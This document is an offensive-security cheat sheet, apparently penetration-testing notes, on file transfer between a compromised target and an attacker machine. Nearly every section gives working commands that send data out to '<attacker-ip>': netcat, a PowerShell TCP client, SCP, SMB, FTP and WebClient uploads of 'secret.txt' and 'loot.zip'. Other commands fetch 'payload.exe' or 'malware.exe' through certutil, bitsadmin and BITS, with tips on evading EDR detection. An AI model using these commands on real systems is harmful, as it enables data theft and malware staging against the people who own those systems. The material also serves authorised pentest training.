# File Transfer Techniques

| Method | When to use |
|---|---|
| `python3 -m http.server` | Fastest for pulling files to attacker from Linux target |
| `impacket-smbserver share .` | Windows targets — mount as a drive letter |
| `curl -T file http://<attacker-ip>/upload` | Pushing files to attacker-controlled server |
| `nc -w3 <attacker-ip> 4444 < file` | Simple, no dependencies |
| Certutil (Windows) | `certutil -urlcache -split -f http://<attacker-ip>/file out` |
| DNS exfil | When only port 53 outbound is allowed |

!!! tip "Tip"
    For Windows file transfers, `certutil` and `bitsadmin` are LOLBins — no dropped binaries. `certutil -urlcache -split -f <url> <output>` works on most Windows versions.

---

## Netcat

### Linux to Linux

```bash
# Sender
nc -lvnp 4444 < secret.txt

# Receiver
nc <attacker-ip> 4444 > retrieved.txt
```

### Windows to Linux

Windows doesn't ship with netcat — PowerShell TCP client is the drop-in replacement:

```powershell
# Sender (Windows, no external binaries)
$c = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes('C:\Users\Public\secret.txt')
$s.Write($b,0,$b.Length); $s.Close()
```

```bash
# Receiver (Linux)
nc -lvnp 4444 > retrieved.txt
```

---

## SCP

### Linux to Linux

```bash
scp secret.txt <user>@<attacker-ip>:/tmp/
```

### Windows to Linux

```powershell
scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/
```

---

## SMB

### Map a Network Drive (Windows)

```powershell
net use \\<attacker-ip>\shared_folder /user:attacker secretpassword
copy C:\sensitive_data.txt \\<attacker-ip>\shared_folder\
```

### SMBClient (Linux)

```bash
smbclient -U <user> //<attacker-ip>/C$ -c 'put backdoor.exe'
```

---

## FTP

### Interactive Upload

```bash
ftp 10.10.10.10
put secret.txt
```

### Automated via PowerShell

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("ftp://<attacker-ip>/secret.txt", "C:\sensitive.txt")
```

---

## HTTP

### Python HTTP Server (attacker-side)

```bash
python3 -m http.server 8000
```

### Download on Target

```bash
wget http://<attacker-ip>:8000/secret.txt -O /tmp/secret.txt
curl http://<attacker-ip>/malware.exe -o /tmp/malware.exe
```

---

## PowerShell

### Download File

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
```

### Certutil (LOLBin)

```powershell
certutil -urlcache -split -f http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
```

### BITS Transfer (LOLBin)

Lower-signature than certutil on modern EDR. Uses the Background Intelligent Transfer Service — the same one Windows Update uses.

```powershell
Start-BitsTransfer -Source http://<attacker-ip>/payload.exe -Destination C:\Windows\Temp\payload.exe
bitsadmin /transfer job /download /priority foreground http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
```

### Upload via WebClient / Invoke-RestMethod

```powershell
# Upload
(New-Object System.Net.WebClient).UploadFile('http://<attacker-ip>/upload', 'C:\loot.zip')
Invoke-RestMethod -Uri http://<attacker-ip>/upload -Method POST -InFile C:\loot.zip
```
